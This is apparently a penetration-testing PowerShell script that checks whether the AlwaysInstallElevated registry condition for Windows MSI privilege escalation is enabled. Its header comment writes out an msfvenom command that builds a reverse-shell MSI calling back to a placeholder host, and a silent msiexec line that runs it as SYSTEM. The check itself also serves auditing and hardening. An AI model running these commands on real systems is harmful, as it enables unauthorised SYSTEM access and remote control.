<#
.SYNOPSIS
    Check the AlwaysInstallElevated MSI privesc condition.
.NOTES
    Both keys must be 1. If so, any MSI runs as SYSTEM:
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=a LPORT=p -f msi -o p.msi
        msiexec /quiet /qn /i p.msi
#>
$hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue).AlwaysInstallElevated

"HKLM\...\Installer\AlwaysInstallElevated = $hklm"
"HKCU\...\Installer\AlwaysInstallElevated = $hkcu"

if ($hklm -eq 1 -and $hkcu -eq 1) {
    Write-Host "[+] AlwaysInstallElevated ENABLED — any MSI runs SYSTEM" -ForegroundColor Green
} elseif ($hklm -eq 1 -xor $hkcu -eq 1) {
    Write-Host "[-] Only one key set; both required" -ForegroundColor Yellow
} else {
    Write-Host "[-] Not exploitable" -ForegroundColor DarkGray
}
